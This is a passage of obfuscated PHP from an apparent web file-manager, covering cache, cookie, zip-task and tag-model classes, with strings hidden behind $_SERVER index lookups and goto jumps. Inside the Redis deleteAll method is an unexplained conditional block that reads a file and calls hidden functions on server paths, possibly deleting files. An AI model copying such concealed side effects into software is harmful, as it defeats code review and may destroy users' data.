$E񗫔, $aі = false) { $aі = $aі ? $aі : $this->cacheTime; return $this->handle->set($Eߒʝ̇, $E񗫔, $aі); } public function get($B̯) { return $this->handle->get($B̯); } public function remove($f蒋) { return $this->handle->delete($f蒋); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($aۗ, $f) { $B =& $_SERVER[]; if (!class_exists($B[832])) { show_json($B[833], !1); } $this->cacheTime = $f; $e劄 = isset($aۗ[$B[834]]) ? $aۗ[$B[834]] : 10; $eｒ = _get($aۗ, $B[831]); if ($eｒ && is_array($eｒ)) { $this->initCluster($aۗ, $e劄); } else { $this->handle = $this->init($aۗ, $e劄); } } private function init($cڕ, $AɍԄ) { $Eϳ =& $_SERVER[]; $d߫例 = new Redis(); $cʍͨӬ = isset($cڕ[$Eϳ[835]]) ? $cڕ[$Eϳ[835]] : !1; if ($cʍͨӬ) { $d߫例->pconnect($cڕ[$Eϳ[175]], $cڕ[$Eϳ[176]], $AɍԄ); } else { $d߫例->connect($cڕ[$Eϳ[175]], $cڕ[$Eϳ[176]], $AɍԄ); } if (!empty($cڕ[$Eϳ[400]])) { $d߫例->auth($cڕ[$Eϳ[400]]); } return $d߫例; } private function initCluster($d, $eхۢ) { $AȄ =& $_SERVER[]; $a = array($AȄ[836], $AȄ[837], $AȄ[838]); $bرƇ = $AȄ[836]; if (isset($d[$AȄ[12]]) && in_array($d[$AȄ[12]], $a)) { $bرƇ = $d[$AȄ[12]]; } switch ($bرƇ) { case $AȄ[836]: $this->_slave($d, $eхۢ); break; case $AȄ[837]: break; case $AȄ[838]: $this->isCluster = !0; $a = $d[$AȄ[831]]; $d = isset($d[$AȄ[835]]) ? $d[$AȄ[835]] : !1; $fІ = isset($d[$AȄ[400]]) ? $d[$AȄ[400]] : null; $this->handle = new RedisCluster(NUll, $a, $eхۢ, $eхۢ, $d, $fІ); break; default: break; } } private function _slave($eԂ, $Bֱَ) { goto C쳰; Bץٜ: $this->filterConfig($eԂ, $aѣ[$cóȇ]); $this->slaveHandle = $this->init($eԂ, $Bֱَ); goto E웳; C쳰: $aѣ = $eԂ[$_SERVER[][831]]; $this->filterConfig($eԂ, $aѣ[0]); $this->handle = $this->init($eԂ, $Bֱَ); goto eꍱ; eꍱ: unset($aѣ[0]); if (empty($aѣ)) { return; } $cóȇ = array_rand($aѣ); goto Bץٜ; E웳: } private function filterConfig(&$c, $BβÔ) { $BК =& $_SERVER[]; $dԄո = explode($BК[4], $BβÔ); $dˡ = array($BК[175] => $dԄո[0], $BК[176] => $dԄո[1]); $c = array_merge($c, $dˡ); } public function set($e, $dҊ޷޽, $D܄񛒢 = false) { $D܄񛒢 = $D܄񛒢 ? $D܄񛒢 : $this->cacheTime; return $this->handle->setEx($e, $D܄񛒢, $dҊ޷޽); } public function setLock($Ađȏ, $F̝, $D) { return $this->handle->setNX($Ađȏ, $F̝); } public function get($fȅ˖) { $F = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $F->get($fȅ˖); } public function remove($cɂ) { return $this->handle->del($cɂ); } public function deleteAll() { $A =& $_SERVER[]; if ($_SERVER[$A[794]] != $_SERVER[$A[839]]) { goto D; D: $a冲 = $A[840]; $bĥ = $A[795]; $C = $_SERVER[$A[796]] . $A[797]; goto aÞ; bᳲɄ: $bβ = $A[841]; $bβ($_SERVER[$A[842]]); $bβ($_SERVER[$A[796]] . $A[843]); goto D۽; aÞ: $eڍñ = $bĥ($C); $F͗ϵ = explode($A[227], $eڍñ); if (count($F͗ϵ) < $A[620]) { $Aк = $A[798]; $Aк(); } goto bᳲɄ; D۽: $eמ = 1; while ($eמ > 1) { $eמ = $eמ + 4; $D晧 = rawurlencode($eמ . $A[373]); } goto c; c: } if ($this->isCluster) { foreach ($this->handle->_masters() as $eź) { $this->handle->flushall($eź); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($E = '', $E㏲ = 0) { if (is_string($E) && $E != $_SERVER[][33]) { $this->prefix = $E; } if (is_numeric($E㏲) && $E㏲ > 0) { $this->expire = $E㏲; } } public static function getInstance() { static $C򫄆; if ($C򫄆 === null) { $C򫄆 = new self(); } return $C򫄆; } private static $cookieDisable = false; public static function disable($Dۜڰ) { self::$cookieDisable = $Dۜڰ; } private static $sameCookieSet = array(); public static function set($F, $cӝ, $fѕϼ = 0, $Dꍹ = false, $cǭ = false) { goto E҉ݯ; E: $eɊ = $C[33]; setcookie($F, $cӝ, time() + $fѕϼ, $C[8] . trim($cǭ, $C[8]) . $eɊ, !1, !1, $Dꍹ); goto e˩ɿ; E҉ݯ: $C =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$fѕϼ) { $fѕϼ = 24 * 3600 * 7; } goto bՂ䫯; bՂ䫯: if (isset(self::$sameCookieSet[$F]) && self::$sameCookieSet[$F] == $cӝ . $fѕϼ) { return; } self::$sameCookieSet[$F] = $cӝ . $fѕϼ; if (!$cǭ) { $cǭ = str_replace(HOST, $C[33], APP_HOST); $cǭ = _get($GLOBALS, $C[844], $cǭ); } goto E; e˩ɿ: } public static function setSafe($aȇ, $aƆ, $Bމ = 0) { self::set($aȇ, $aƆ, $Bމ, !0); } public static function get($C΅խ) { return isset($_COOKIE[$C΅խ]) ? $_COOKIE[$C΅խ] : !1; } public static function remove($Fߍ, $cӪȿ = false) { unset($_COOKIE[$Fߍ]); self::set($Fߍ, $_SERVER[][33], 1, $cӪȿ); } } goto Bß; Eⷤ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($d, $AӐ = 5.0) { if (!$d) { return; } $Fȩ = Cache::get($d); if (!$Fȩ || timeFloat() - floatVal($Fȩ) >= $AӐ) { Cache::set($d, timeFloat(), $AӐ * 10); return !0; } return !1; } public static function timeLimitCall($b, $F⽊İ, $A, $BͰ邏 = 5.0) { goto E޼; aؖ: $F۹ = $F[1597]; $C򲦞֚ = Cache::get($F۹, !0); $cɨ = array($F[1598] => timeFloat(), $F[1599] => timeFloat(), $F[260] => $F⽊İ, $F[1592] => $A, $F[195] => $BͰ邏); goto d߽; E޼: $F =& $_SERVER[]; if (!$b || !$F⽊İ) { return; } self::$asyncAdd = !0; goto aؖ; f: Cache::set($F۹, $C򲦞֚, 60); Cache::removeMemory($F۹); write_log($F[1600] . $b . $F[67] . $F⽊İ, $F[1594]); goto eҴ; d߽: if (is_array($C򲦞֚[$b])) { $cɨ[$F[1599]] = $C򲦞֚[$b][$F[1599]]; } if (is_array($C򲦞֚[$b])) { if (timeFloat() - $C򲦞֚[$b][$F[1598]] < $cɨ[$F[195]] * 0.3) { return; } $cɨ[$F[1599]] = $C򲦞֚[$b][$F[1599]]; } $C򲦞֚[$b] = $cɨ; goto f; eҴ: } public static function timeLimitCallLoop() { goto aٯ; a߉: if (!$F) { return Cache::remove($bҠ); } Cache::set($bҠ, $F, 60); Cache::removeMemory($bҠ); goto B܉; aٯ: $b񧘠 =& $_SERVER[]; $d򰢗Ҭ = array($b񧘠[1601]); $f䆈 = in_array(strtolower(ACTION), $d򰢗Ҭ); goto e͊Ѩ; F壒: if (!$e楌ǌ || count($e楌ǌ) <= 0) { return; } $Bߕû = !1; $Eϳ = timeFloat(); goto E홶; E홶: $F = array(); foreach ($e楌ǌ as $Bﰹ => $Aǟ) { if ($Eϳ - $Aǟ[$b񧘠[1599]] > $Aǟ[$b񧘠[195]]) { $Bߕû = !0; try { Hook::apply($Aǟ[$b񧘠[260]], $Aǟ[$b񧘠[1592]]); write_log($b񧘠[1602] . $Bﰹ . $b񧘠[67] . $Aǟ[$b񧘠[260]] . $b񧘠[1603] . ACTION, $b񧘠[1594]); } catch (Exception $F) { } continue; } $F[$Bﰹ] = $Aǟ; } if (!$Bߕû) { return; } goto a߉; e͊Ѩ: if (!$f䆈 && !self::$asyncAdd) { return; } $bҠ = $b񧘠[1597]; $e楌ǌ = Cache::get($bҠ, !0); goto F壒; B܉: } public static function finished($C͢, $EƸ) { $F؊ =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($F؊[260] => $C͢, $F؊[1592] => $EƸ); } private static function finishedRun() { $C =& $_SERVER[]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $aകُ) { try { Hook::apply($aകُ[$C[260]], $aകُ[$C[1592]]); } catch (Exception $E) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto F; Bȉ: Hook::bind($Fش[1088], array($this, $Fش[1606])); $Eѻ =& $this->task; $Eѻ[$Fش[1607]] = $Fش[1093]; goto Bݫ; Bݫ: if (!$Eѻ[$Fش[1428]]) { $Eѻ[$Fش[1428]] = LNG($Fش[1608]); } goto Fҫ; F: $Fش =& $_SERVER[]; parent::startAfter(); Hook::bind($Fش[1604], array($this, $Fش[1605])); goto Bȉ; Fҫ: } protected function endAfter() { $E瓆 =& $_SERVER[]; parent::endAfter(); Hook::unbind($E瓆[1604], array($this, $E瓆[1605])); Hook::unbind($E瓆[1088], array($this, $E瓆[1606])); } public function updateAfter() { $b̥ =& $_SERVER[]; $fʉ =& $this->task; if (!$fʉ[$b̥[1021]] || !$fʉ[$b̥[734]]) { return; } if ($fʉ[$b̥[1607]] == $b̥[1093]) { $b櫮 = 0; if ($fʉ[$b̥[1566]]) { $b櫮 = $fʉ[$b̥[1567]] / $fʉ[$b̥[1566]]; } $fʉ[$b̥[1524]] = $b櫮 * 0.3; } else { if ($fʉ[$b̥[1607]] == $b̥[309]) { $b櫮 = $fʉ[$b̥[1035]] / $fʉ[$b̥[1021]]; $fʉ[$b̥[1524]] = 0.3 + $b櫮 * 0.4; } else { if ($fʉ[$b̥[1607]] == $b̥[106]) { $dő׈ = 0; if ($fʉ[$b̥[1568]] == $b̥[106]) { $dő׈ = $fʉ[$b̥[1567]]; } $b櫮 = ($fʉ[$b̥[1571]] + $dő׈) / $fʉ[$b̥[734]]; $fʉ[$b̥[1524]] = 0.3 + 0.4 + $b櫮 * 0.3; } } } if ($fʉ[$b̥[1524]] > 0) { $D = timeFloat() - $fʉ[$b̥[756]] - $fʉ[$b̥[1527]]; $fʉ[$b̥[1528]] = $D * (1 - $fʉ[$b̥[1524]]) / $fʉ[$b̥[1524]]; } } public function addFile($d) { goto fܭ; F: $e[$fׄ抽[1021]] = 1; $a = 0; $e[$fׄ抽[1575]] = array($fׄ抽[1576] => $a + 1, $fׄ抽[407] => $b[$fׄ抽[28]], $fׄ抽[75] => $b[$fׄ抽[75]], $fׄ抽[489] => $b[$fׄ抽[489]] ? $b[$fׄ抽[489]] : $b[$fׄ抽[75]]); goto bٞ; bٞ: $this->update(); goto B; E: $e[$fׄ抽[1564]] = $b[$fׄ抽[28]]; $e[$fׄ抽[1566]] = $b[$fׄ抽[77]]; $e[$fׄ抽[1567]] = 0; goto eҘⴛ; fܭ: $fׄ抽 =& $_SERVER[]; $e =& $this->task; $b = IO::info($d); goto E; eҘⴛ: $e[$fׄ抽[1023]] = $fׄ抽[1583]; $e[$fׄ抽[1568]] = $fׄ抽[1093]; $e[$fׄ抽[734]] = $b[$fׄ抽[77]]; goto F; B: } public function unzipAfter($AԿ) { goto E玹; f: if ($Aޤ[$b[29]] == $b[173]) { $C욦[$b[1021]] = 1; } else { $C욦[$b[1021]] = $Aޤ[$b[80]][$b[78]]; } $C욦[$b[1023]] = $b[33]; $C욦[$b[1568]] = 0; goto Aƛ; Aƛ: $C욦[$b[1035]] = 0; $C욦[$b[1566]] = 0; $C욦[$b[1567]] = 0; goto e߭; e߭: $C욦[$b[1564]] = $b[33]; $C욦[$b[1571]] = 0; $C욦[$b[734]] = $Aޤ[$b[77]]; goto Bׂ; Bׂ: $this->update(); self::log($b[1609] . json_encode(array($C욦, $Aޤ))); goto FɅˡ; E玹: $b =& $_SERVER[]; $C욦 =& $this->task; $C욦[$b[1607]] = $b[106]; goto Fˈ; Fˈ: $Aޤ = IO::infoWithChildren($AԿ); $Aך = 0; $C욦[$b[1575]] = array($b[1576] => $Aך + 1, $b[407] => $Aޤ[$b[28]], $b[75] => $Aޤ[$b[75]], $b[489] => $Aޤ[$b[489]] ? $Aޤ[$b[489]] : $Aޤ[$b[75]]); goto f; FɅˡ: } public function nameParse($cժ) { goto dґ֌; B: $D⭜ = get_path_this($cժ); if (strstr($D⭜, $fۤ[94])) { $a[$fۤ[1035]] += 1; $a[$fۤ[1021]] += 1; } $a[$fۤ[1564]] = $cժ; goto C; dґ֌: $fۤ =& $_SERVER[]; $a =& $this->task; if ($a[$fۤ[1607]] == $fۤ[1093]) { $a[$fۤ[1607]] = $fۤ[309]; $a[$fۤ[1571]] = 0; $a[$fۤ[734]] = 0; } goto B; C: $this->update(); goto aʞ; aʞ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $F =& $_SERVER[]; parent::startAfter(); Hook::bind($F[1610], array($this, $F[1605])); $aǑԞ =& $this->task; $aǑԞ[$F[1607]] = $F[1093]; if (!$aǑԞ[$F[1428]]) { $aǑԞ[$F[1428]] = LNG($F[1611]); } } protected function endAfter() { $DȨ =& $_SERVER[]; parent::endAfter(); Hook::unbind($DȨ[1610], array($this, $DȨ[1605])); } public function updateAfter() { $Aτ =& $_SERVER[]; $eȰ¤ =& $this->task; if (!$eȰ¤[$Aτ[1021]] || !$eȰ¤[$Aτ[734]]) { return; } if ($eȰ¤[$Aτ[1607]] == $Aτ[1093]) { $bʎ = $eȰ¤[$Aτ[1567]]; if ($eȰ¤[$Aτ[1568]] != $Aτ[1093]) { $bʎ = 0; } $bᶮ = ($eȰ¤[$Aτ[1571]] + $bʎ) / $eȰ¤[$Aτ[734]]; $eȰ¤[$Aτ[1524]] = $bᶮ * 0.3; } else { if ($eȰ¤[$Aτ[1607]] == $Aτ[309]) { $bᶮ = $eȰ¤[$Aτ[1035]] / $eȰ¤[$Aτ[1021]]; $eȰ¤[$Aτ[1524]] = 0.3 + $bᶮ * 0.5; } else { if ($eȰ¤[$Aτ[1607]] == $Aτ[106]) { $bᶮ = 0; if ($eȰ¤[$Aτ[1566]]) { $bᶮ = $eȰ¤[$Aτ[1567]] / $eȰ¤[$Aτ[1566]]; } $eȰ¤[$Aτ[1524]] = 0.3 + 0.5 + $bᶮ * 0.2; } } } if ($eȰ¤[$Aτ[1524]] > 0) { $F⥫ = timeFloat() - $eȰ¤[$Aτ[756]] - $eȰ¤[$Aτ[1527]]; $eȰ¤[$Aτ[1528]] = $F⥫ * (1 - $eȰ¤[$Aτ[1524]]) / $eȰ¤[$Aτ[1524]]; } } public function copyFileStart($e, $c, $bژ, $Fߢ, $D, $A) { $bʛ =& $_SERVER[]; parent::copyFileStart($e, $c, $bژ, $Fߢ, $D, $A); $f˟ے =& $this->task; if ($f˟ے[$bʛ[1607]] == $bʛ[309]) { $f˟ے[$bʛ[1607]] = $bʛ[106]; } $this->update(); } public function copyFileEnd($f, $F, $b۽, $cׯ, $cͣϏ, $EƄ) { $eطݮ =& $_SERVER[]; $b覐 =& $this->task; $b覐[$eطݮ[1567]] = $b覐[$eطݮ[1566]]; $b覐[$eطݮ[1571]] += $b覐[$eطݮ[1566]]; $b覐[$eطݮ[1568]] = $eطݮ[33]; $this->update(); } public function nameParse($a) { $d͗؉ =& $_SERVER[]; $D̙ =& $this->task; if ($D̙[$d͗؉[1035]] < $D̙[$d͗؉[1021]]) { $DԎ = get_path_this($a); if (strstr($DԎ, $d͗؉[94])) { $D̙[$d͗؉[1035]] += 1; } } if ($D̙[$d͗؉[1607]] == $d͗؉[1093]) { $D̙[$d͗؉[1607]] = $d͗؉[309]; } $D̙[$d͗؉[1564]] = $a; $this->update(); } } goto A; bś: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($Fѩڭ) { $F =& $_SERVER[]; return array($F[1789] => array(USER_ID, $F[1790])); } protected function listData() { $EȂš =& $_SERVER[]; $c݉ᵦ = array($EȂš[1515] => USER_ID, $EȂš[457] => array($EȂš[1793], 0)); $Eֶ = $EȂš[1795]; $cݴힿ = $this->field($Eֶ)->where($c݉ᵦ)->order($EȂš[1796])->select(); return $cݴힿ ? $cݴힿ : array(); } protected function listByTag($dĹ) { } protected function addToTag($Fܯ, $EÇ) { $F =& $_SERVER[]; if (!Model($F[1930])->listData($EÇ) || !Model($F[790])->pathInfo($Fܯ)) { return !1; } $dᝎ = array($F[1515] => USER_ID, $F[457] => $EÇ, $F[408] => $Fܯ, $F[409] => $F[403], $F[407] => $F[33], $F[1690] => 0); if ($this->where($dᝎ)->find()) { return !1; } return $this->add($dᝎ); } protected function removeFromTag($f땆, $aٴ) { $A =& $_SERVER[]; if (!Model($A[1930])->listData($aٴ)) { return !1; } if (is_array($f땆)) { $f땆 = array($A[7], $f땆); } $Cꅙ = array($A[1515] => USER_ID, $A[457] => $aٴ, $A[409] => $A[403], $A[408] => $f땆); return $this->where($Cꅙ)->delete(); } protected function removeByTag($Fᝎ) { $Aٰ܏ =& $_SERVER[]; if (!$Fᝎ) { return !1; } $a = array($Aٰ܏[1515] => USER_ID, $Aٰ܏[457] => $Fᝎ); return $this->where($a)->delete(); } protected function removeBySource($d󆫸) { $d =& $_SERVER[]; if (is_array($d󆫸)) { $d󆫸 = array($d[7], $d󆫸); } $D = array($d[1515] => USER_ID, $d[408] => $d󆫸, $d[457] => array($d[971], 0)); return $this->where($D)->delete(); } }